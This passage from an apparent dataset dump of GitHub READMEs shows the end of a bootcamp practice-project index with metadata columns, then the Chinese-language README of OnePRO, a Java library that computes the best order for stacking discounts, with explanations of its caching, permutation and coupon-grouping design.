| 12      | 1  |[Library Management API](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/12-WeekTwelve/LibraryManagementAPI)|
</details>

<details>
<summary>Week 13 Practices</summary>
<br>

- Project Week

</details>

<details>
<summary>Week 14 Practices</summary>
<br>

- Project Week

</details>

<details>
<summary>Week 15 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 15     | 1  |[Veterinary Management System API](https://github.com/semih-turan/Veterinary-Management-System-API)|
</details>

#### Frontend Phase

<details>
<summary>Pre-Work</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| -       | 1  |[Pre-Work-Task](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/Pre-Work/Pre-Work-Task)|

</details>

<details>
<summary>Week 17 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 17       | 1  |[Working-with-Tables](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Working-with-Tables)|
| 17       | 2  |[Form-Usage](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Form-Usage)|
| 17       | 3  |[First-Web-Site](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/First-Web-Site)|
| 17       | 4  |[Personal-Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Personal-Blog)|
| 17       | 5  |[Dev-Site](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteenth/TributeWebsite)|


</details>

<details>
<summary>Week 18 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 18       | 1  |[Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/Blog)|
| 18       | 2  |[Tribute Website](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/Blog)|
| 18       | 3  |[Registration Form](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/RegistrationForm)|

</details>

<details>
<summary>Week 19 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 19       | 1  |[Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/19-WeekNineteeth/InstagramClone)|
| 19       | 2  |[Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/19-WeekNineteeth/Blog)|

</details>

<details>
<summary>Week 20 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 20       | 1  |[Landing Page](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/20-WeekTwentieth/LandingPage)|
| 20       | 2  |[Review Page](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/20-WeekTwentieth/ReviewPage)|

</details>

<details>
<summary>Week 21 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 21       | 1  |[Time and Greeting](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/21-WeekTwentyFirst/Time-and-Greeting)|
| 21       | 2  |[Drum Kit](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/21-WeekTwentyFirst/Drum-Kit)|

</details>

<details>
<summary>Week 22 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 22       | 1  |[To-Do App](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/22-WeekTwentySecond/to-do)|
| 22       | 2  |[Asian Kitchen](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/22-WeekTwentySecond/asian-kitchen)|
</details>

<details>
<summary>Week 23 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
|23      | 1  |[Responsive Web App](https://github.com/semih-turan/Responsive-Web-App)|

</details>

<details open>
<summary>Week 24 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
|24      | 1  |[Sports Center](https://github.com/semih-turan/Sports-Center)|

</details>

---

### Usage Rights

All projects and practice exercises are freely available for use. You are welcome to explore, modify, and share them as you wish. If you have any questions, please don't hesitate to contact me.
",0,0,1,mit,0.0,"['full', 'stack', 'web', 'development', 'bootcamp', 'repository', 'patika', 'repository', 'serf', 'extensive', 'compilation', 'project', 'practice', 'session', 'completed', 'throughout', 'journey', 'advance', 'program', 'project', 'practice', 'session', 'thoughtfully', 'arranged', 'specific', 'folder', 'within', 'repository', 'purpose', 'repository', 'serf', 'comprehensive', 'record', 'learning', 'journey', 'designed', 'document', 'progress', 'provide', 'reference', 'point', 'personal', 'reflection', 'potential', 'collaboration', 'centralized', 'structure', 'aim', 'create', 'organized', 'accessible', 'archive', 'coding', 'pursuit', 'table', 'content', 'backend', 'phase', 'practice', 'grade', 'point', 'average', 'calculator', 'vat', 'calculator', 'triangle', 'area', 'taxi', 'meter', 'circle', 'area', 'body', 'mass', 'index', 'green', 'grocer', 'calculator', 'calculator', 'login', 'passing', 'grade', 'activity', 'recommendation', 'horoscope', 'flight', 'ticket', 'chineese', 'zodiac', 'bissextile', 'even', 'number', 'odd', 'number', 'power', 'scope', 'combination', 'exponent', 'digit', 'sum', 'harmonic', 'series', 'diamond', 'atm', 'gdc', 'lcm', 'calculator', 'find', 'biggest', 'number', 'perfect', 'number', 'inverted', 'triangle', 'prime', 'number', 'fibonacci', 'series', 'precedence', 'casting', 'practice', 'polindrome', 'advance', 'calculator', 'recursive', 'exponential', 'recursive', 'prime', 'number', 'recursive', 'pattern', 'recursive', 'pattern', 'second', 'student', 'information', 'system', 'boxer', 'game', 'salary', 'calculator', 'harmonic', 'average', 'nearest', 'max', 'min', 'printsb', 'repeating', 'even', 'number', 'sorting', 'array', 'freq', 'array', 'matrix', 'transpose', 'guess', 'number', 'palindrome', 'word', 'practice', 'mine', 'sweeper', 'game', 'practice', 'adventure', 'game', 'list', 'practice', 'try', 'catch', 'block', 'book', 'sorter', 'word', 'frequency', 'patika', 'store', 'sql', 'assignment', 'one', 'practice', 'sql', 'assignment', 'two', 'sql', 'assignment', 'three', 'file', 'read', 'sum', 'notepad', 'jdbcdb', 'practice', 'rent', 'car', 'feast', 'ramadan', 'practice', 'tourism', 'agency', 'management', 'practice', 'tourism', 'agency', 'management', 'practice', 'library', 'management', 'system', 'practice', 'library', 'management', 'api', 'project', 'week', 'project', 'week', 'practice', 'veterinary', 'management', 'system', 'api', 'frontend', 'phase', 'practice', 'practice', 'practice', 'blog', 'tribute', 'website', 'registration', 'form', 'practice', 'blog', 'blog', 'practice', 'landing', 'page', 'review', 'page', 'practice', 'time', 'greeting', 'drum', 'kit', 'practice', 'app', 'asian', 'kitchen', 'practice', 'responsive', 'web', 'app', 'practice', 'sport', 'center', 'usage', 'rights', 'project', 'practice', 'exercise', 'freely', 'available', 'use', 'welcome', 'explore', 'modify', 'share', 'wish', 'question', 'please', 'hesitate', 'contact']","['practice', 'number', 'calculator', 'project', 'management']",0,0,0,"['the', 'full', 'stack', 'web', 'development', 'bootcamp', 'repository', 'patika', 'purpose', 'table', 'content', 'backend', 'phase', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'frontend', 'phase', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'usage', 'right']",28,"['practice', 'phase', 'the', 'full', 'stack']",0,0.0,2.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,2.0,0.0,16394,273.25,5.180695333943276,"['![Patika+ Türkiye\'nin En Kapsamlı Web Developer Bootcamp\'i](/readmeAssets/logo.png ""Patika+ Türkiye\'nin En Kapsamlı Web Developer Bootcamp\'i"") -> https://patika.dev', 'Grade Point Average Calculator -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GradePointAverageCalculator', 'VAT Calculator -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/VATCalculator', 'Triangle Area -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/TriangleArea', 'Taxi Meter -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/TaxiMeter', 'Circle Area -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/CircleArea', 'Body Mass Index -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/BodyMassIndex', 'Green Grocer Calculator -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GreenGrocerCalculator', 'Calculator -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Calculator', 'Login -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Login', 'Passing Grade -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PassingGrade', 'Activity Recommendation -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/ActivityRecommendation', 'Horoscope -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Horoscope', 'Flight Ticket -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FlightTicket', 'Chineese Zodiac -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Chinese%20Zodiac', 'Bissextile -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Bissextile', 'Even Numbers -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/EvenNumbers', 'Odd Numbers -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/OddNumbers', 'Power Scope -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PowerScope', 'Combination -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Combination', 'Exponents -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Exponents', 'Digit Sum -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/DigitSum', 'Harmonic Series -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/HarmonicSeries', 'Diamond -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Diamond', 'ATM -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/ATM', 'GDC and LCM Calculator -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GdcLcmCalculator', 'Find Biggest Number -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FindBiggestNumber', 'Perfect Number -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PerfectNumber', 'Inverted Triangle -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/InvertedTriangle', 'Prime Number -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PrimeNumber', 'Fibonacci Series -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FibonacciSeries', 'Precedence -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Precedence', 'Casting -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Casting', 'Polindrome -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/Polindrome', 'Advance Calculator -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/AdvanceCalculator', 'Recursive Exponential -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursiveExponential', 'Recursive Prime Number -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePrimeNumber', 'Recursive Pattern -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePattern', 'Recursive Pattern Second -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePatternSecond', 'Student Information System -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/StudentInformationSystem', 'Boxer Game -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/BoxerGame', 'Salary Calculator -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/SalaryCalculator', 'Harmonic Average -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/HarmonicAverage', 'Nearest Max Min -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/NearestMaxMin', 'PrintsB -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/PrintsB', 'Repeating Even Numbers -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RepeatingEvenNumbers', 'Sorting Arrays -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/SortingArrays', 'Freq Arrays -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/FreqArrays', 'Matrix Transpose -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/MatrixTranspose', 'Guess Number -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/GuessNumber', 'Palindrome Words -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/PalindromeWords', 'Mine Sweeper Game -> https://github.com/semih-turan/Mine-Sweeper-Game', 'Adventure Game -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/04-WeekFour/AdventureGame', 'List -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/04-WeekFour/List', 'Try Catch Block -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/TryCatchBlock', 'Book Sorter -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/BookSorter', 'Word Frequency -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/WordFrequency', 'Patika Store -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/PatikaStore', 'SQL Assignments One -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/SQLAssignmentsOne', 'SQL Assignments Two -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/SQLAssignmentsTwo', 'SQL Assignments Three -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/SQLAssignmentsThree', 'File Read Sum -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/FileReadSum', 'Notepad -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/Notepad', 'JDBCDB -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/JDBCDB', 'Rent a Car -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/07-WeekSeven/RentACar', 'Tourism Agency Management -> https://github.com/semih-turan/Tourism-Agency-Management', 'Tourism Agency Management -> https://github.com/semih-turan/Tourism-Agency-Management', 'Library Management System -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/11-WeekEleven/LibraryManagementSystem', 'Library Management API -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/12-WeekTwelve/LibraryManagementAPI', 'Veterinary Management System API -> https://github.com/semih-turan/Veterinary-Management-System-API', 'Pre-Work-Task -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/Pre-Work/Pre-Work-Task', 'Working-with-Tables -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Working-with-Tables', 'Form-Usage -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Form-Usage', 'First-Web-Site -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/First-Web-Site', 'Personal-Blog -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Personal-Blog', 'Dev-Site -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteenth/TributeWebsite', 'Blog -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/Blog', 'Tribute Website -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/Blog', 'Registration Form -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/RegistrationForm', 'Blog -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/19-WeekNineteeth/InstagramClone', 'Blog -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/19-WeekNineteeth/Blog', 'Landing Page -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/20-WeekTwentieth/LandingPage', 'Review Page -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/20-WeekTwentieth/ReviewPage', 'Time and Greeting -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/21-WeekTwentyFirst/Time-and-Greeting', 'Drum Kit -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/21-WeekTwentyFirst/Drum-Kit', 'To-Do App -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/22-WeekTwentySecond/to-do', 'Asian Kitchen -> https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/22-WeekTwentySecond/asian-kitchen', 'Responsive Web App -> https://github.com/semih-turan/Responsive-Web-App', 'Sports Center -> https://github.com/semih-turan/Sports-Center']",89
GaoSSR/OnePRO,main,"<div align=center>
  <img width=""365"" src=""./READMEIMG/Project-Name.png"" />
</div>


<div align=""center"">
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%9E%84%E5%BB%BA"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%B5%8B%E8%AF%95"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%96%87%E6%A1%A3"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/badge/%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE-Apache-brightgreen"" alt=""License""></a>
 </div>
<br />

## 轻量级算法驱动优惠叠加器

#### RT：
 <img width=""1000"" src=""./READMEIMG/211690962797_.pic.jpg"" />


#### 背景：

优惠是推动消费者转化的关键因素，它在激发用户消费行为上起着核心作用。目前市场上的优惠策略主要涵盖了各种活动（例如拼多多的“砍一刀”，天猫农场的互动，新用户的首次购买，复购，积分等）和优惠券（如折扣券，代金券，商品券，买一赠一等）。然而，这些复杂的优惠规则使得用户在计算优惠叠加的顺序时感到困扰。这可能导致用户在面对多重优惠时降低购买商品的欲望，尤其是当他们参与了多个活动并持有多个优惠券时，这种情况更为明显。

优惠的计算顺序可以分为平行式和渐进式，其中平行式优惠之间没有相互依赖关系，而渐进式优惠之间则存在依赖关系，即下一个优惠的触发取决于上一个优惠的实施结果。

设想小晴消费了100元，她手头有一张7折优惠券和一张满100元减30元的优惠券。这两个优惠券的使用顺序可能会产生不同的效果，则这2个优惠券的使用顺序有以下两种情况：

<img src=""./READMEIMG/image（1）.png"" width=""75%"">

`OnePRO`采用了一系列新颖的算法，实现了高效求解优惠排列的最优解。

<img src=""./READMEIMG/image（2）.png"" width=""100%"">

#### 核心计算类 Permutation&lt;T extends GoodsItem&gt;

`Permutation`是一个重要的抽象类，作为`OnePRO`的核心，它采用了多种优化策略来确保高性能，这些策略的运用旨在提升计算效率和降低资源消耗，这些策略包括：

- 预存的排列数结果集

之所以采用这种设计，是因为在业务场景中，我们需要频繁进行排列计算。对于给定长度的序列，其排列结果是固定的。在`Permutation`类中，`PERMUTATIONS`属性存储了7以内的排列数结果集。由于这里使用了`Byte`来存储数据，因此占用的内存空间非常小，这有助于提高性能并降低内存消耗。

```Java
private final static Map<Integer,Collection<List<Byte>>> PERMUTATIONS = Maps.newHashMap();

```
这个动作在类加载完成时执行，如果觉得7不合适，对7不满意，可以通过调整`SUPPORTEDSIZE`的大小来满足业务和性能的需求。

我们在实现中经过测试和调整，确定了7是一个相对平衡的参数，它兼顾了业务与性能，当然，根据实际需求，大家可以根据自己的情况来调整这个参数。

```Java
public final static int SUPPORTEDSIZE = 7;

static{
      //前置计算 1-SUPPORTEDSIZE 之间所有排列组合
    for(byte i=1;i<=SUPPORTEDSIZE;i++){
       PERMUTATIONS.put((int)i,Collections2.permutations(IntStream.range(0,i).boxed().map(x->(byte)x.intValue()).collect(Collectors.toList())));
      }
  }

```

- $A_n^3$级别缓存

相对于传统的`Key-Value`结构，解决 $A_n^n$问题的缓存需要进行特殊设计，对于一个优惠集合而言， $A_n^3$意味着需要缓存*n*×(*n*−1)×(*n*−2)条数据。当n=7时，需要缓存210条数据。为了在内存大小和缓存带来的性能收益之间取得平衡， $A_n^3$是最合适的级别。

`Permutation`类通过其成员变量`cache`实现了高性能缓存。

```Java
private final Map<Integer, CalcState<T>> cache = Maps.newHashMap();
```
你或许已经注意到，`cache`的键值使用的是`Integer`类型。在大多数情况下，我们更倾向于使用`String`类型，但在需要进行大量计算的场景中，比如在万次计算的场景下，String字符串的拼接却成了性能瓶颈。

为了实现高性能的键生成，`Permutation`采用了独特的方法。它通过位移对`Byte`数组的前三个字节进行扰动，以确保每个键的唯一性，同时提升性能。

```Java
private static Integer calcKey(List<Byte> a){
       return  a.size()>=3?(a.get(0) << 6)+ (a.get(1) << 3) + a.get(2):0;
}
```

`Permutation`提供了保存点来实现  $A_n^3$ 级别缓存，`CalcState` 记录了计算到第3步的状态，包括当前订单优惠金额和计算过程、已享用优惠的商品等，这些属性的保存和回放`Permutation`已经帮你做好了，`Permutation`额外提供了抽象的保存和回放方法来满足你的个性化诉求。

```Java
   /**
     * 业务将状态记录到保存点
     * @param state 保存点对象
     */
    protected abstract void makeSnapshot(CalcState<T> state,DiscountContext<T> context);

    /**
     * 业务返回保存点状态
     * @param state 保存点对象
     */
    protected abstract void backToSnapshot(CalcState<T> state,DiscountContext<T> context);
```

在优惠计算中，存在一个优先级规则，即优惠计算是有优先级的，需要确保属性`calculateGroup`值较小的优惠先行计算。当发生`backToSnapshot`时，我们需要额外检查缓存中最后一个优惠与当前正准备要计算的优惠之间的关系，如果不满足特定条件，则直接终止计算，直接跳出。而`checkIfWakeUpJump`方法会在缓存被使用后立即判断是否需要继续下去。

#### 上下文类 DiscountContext&lt;T extends GoodsItem&gt;

`DiscountContext`是上下文，也是`Permutation`的成员变量，`DiscountContext`同样包含很多优化策略：

- CalcStage数组

在变更最频繁也是最重要的计算步骤对象`CalcStage`使用数组存储，该数组随着上下文创建而创建，在`Permutation`中使用

```Java
Arrays.fill(arr,null);
```

将该数组清空并让它投入下一次计算，这样一次全排列过程中，数组只会被创建一次，避免了频繁创建数组带来的性能损耗。

- 预计算

`DiscountContext`的初始化是通过静态的`create`方法完成的，该方法将商品与优惠绑定在一起，同时执行一些用户自定义的逻辑，我们称之为“预计算”，预计算的结果被保存在`DiscountContext`的`preCompute`属性中，以便在后续的计算中直接取用，这种方法避免了在后续的高速迭代中重复执行相同的操作，如商品分组和、求和等，从而提高了计算效率。

#### 预计算 PreCompute&lt;T extends GoodsItem&gt;

预计算提供了接口，要使用预计算首先需要实现PreCompute接口

```Java
public interface PreCompute<T extends GoodsItem> {
    /**
     * 判断符合条件的活动类型，符合才会执行preComputeItems
     */
    Set<String> matchTypes();

    /**
     * 对商品做一些复杂集合操作
     * @param items 当前参与优惠的商品
     * @param discount 当前优惠
     * @param preCompute 存储计算的结果
     */
     void preComputeItems(List<T> items, DiscountWrapper discount, Map<String,Object> preCompute);
}
```

此外需要在资源目录下建立`calculator-core.properties`文件，配置内容如下

```Java
precompute.path=你要扫描的包
```
`PreComputeHolder`将处理所有的`PreCompute`实现类，只有`matchTypes`匹配的情况下，才会执行`preComputeItems`方法。

```Java
public class PreComputeHolder {
    public static Set<PreCompute> COMPUTES= Sets.newHashSet();
    private final static String PATH = ""precompute.path"";

    static{
        Properties properties = new Properties();
        try {
              properties = PropertiesLoaderUtils.loadProperties(new FileSystemResource(Objects.requireNonNull(PreComputeHolder.class.getClassLoader().getResource(""calculator-core.properties"")).getPath()));
        } catch (Exception ignore) {
        }
        String path = properties.getProperty(PATH);
        if(StringUtils.isNotBlank(path)){
            Reflections reflections = new Reflections(path);
            Set<Class<? extends PreCompute>> subTypes = reflections.getSubTypesOf(PreCompute.class);
            for(Class<? extends PreCompute> clazz:subTypes){
                try {
                    COMPUTES.add(clazz.newInstance());
                } catch (Exception ignore) {
                }
            }
        }
    }
}
```

#### 计算器 Calculator

`Calculator`是单个优惠的计算接口（即用于优惠计算的接口），它其中定义了一个`calcWarp`方法，负责具体的优惠计算逻辑，但由于`calcWarp`需要承担一些内部的事情，需要处理一些内部细节，因此为了简化使用者的开发工作，我们提供了一个抽象类`AbstractCalculator`，它实现了`calcWarp`方法，并最终暴露了一个更简单更直观的`calc`方法供使用者使用。

`AbstractCalculator`的内容如下，在`AbstractCalculator`中，`calcWarp`方法负责创建`CalcStage`对象，维护`CalcStage`数组等内部工作，这些细节对于使用者来说是透明的，他们只需要关注并实现`calc`方法即可。

```Java
public abstract class AbstractCalculator<T extends GoodsItem> implements Calculator<T> {
    public long calcWarp(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long, T> records, byte idx, int i) {
        CalcStage stage = new CalcStage();
        CalcResult cr = context.getCalcResult();
        long price= cr.getCurPrice();
        stage.setBeforeCalcPrice(price);
        price = calc(context, discountWrapper,records, price, stage);
        if(price<0){
            return price;
        }
        stage.setAfterCalcPrice(price);
        stage.setIndex(idx);
        stage.setStageType(discountWrapper.getType());
        cr.setCurPrice(price);
        if(stage.getBeforeCalcPrice()>stage.getAfterCalcPrice()) {
            cr.getCurStages()[i] = stage;
        }
        return price;
    }

    /**
     * 返回该优惠下的最终要支付的金额,若不符合则返回 prevStagePrice
     * @param context 上下文
     * @param discountWrapper 优惠信息
     * @param records 记录享受过优惠的单品，key是calculateId，这里只提供容器，添加和判断规则由使用者自行决定
     * @param prevStagePrice 上一步计算的订单的价格
     * @param curStage 当前stage
     * @return
     */
    public abstract  long calc(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long,T> records, long prevStagePrice, CalcStage curStage);

}

```
最终用户通过继承`AbstractCalculator`类，并在`Component`注解中指定一个值，而`CalculatorRouter`则通过这个值将请求路由到相应的优惠计算器，这个值与`DiscountWrapper`中的`type`属性相对应。

```Java
@Component(""manjian"")
public class ManjianCalc extends AbstractCalculator<GoodsItem> {
......
}
```


#### 共享互斥协议 DiscountGroup

共享互斥协议是一个数据结构，它是一个数组，数组中最多可以包含两个对象，最少包含一个对象。如果数组中只有一个对象，那么该对象必然为共享组，即组内的优惠可以叠加使用。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            }
            ,
            {
                ""type"": ""activity4"",
                ""id"": ""13""
            } 
            ,
            {
                ""type"": ""coupon1"",
                 ""id"": ""14""
            }
        ]
    }]
```
相应的，当数组中包含两个对象时，第一个对象的`relation`属性可以为`share`或`exclude`，而第二个对象的`relation`属性必须为`exclude`。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            },
            {
                ""type"": ""card3"",
                ""id"":""12""
            }
        ]
    },
    {
        ""relation"": ""exclude"",
        ""items"":
        [
            {
                ""type"": ""card1"",
                ""id"": ""18""
            },
            {
                ""type"": ""coupon1"",
                ""id"": ""22""
            }
        ]
    }
]
```
最终，上述协议将转化为如下两个共享组：

- `activity0-card3-card1` 和 `activity0-card3-coupon1`

工具类 `DiscountGroupUtil` 提供了一个方法，用于将协议转换为共享组。由于共享组可能包含大量优惠，为了提高过滤性能，我们将当前可用的优惠转换为二级`Map`。这个`Map`的外层键是协议中的`type`，而第二层键是协议中的`id`。通过这种方式，我们可以快速地进行交叉过滤，从而提升性能。

```Java
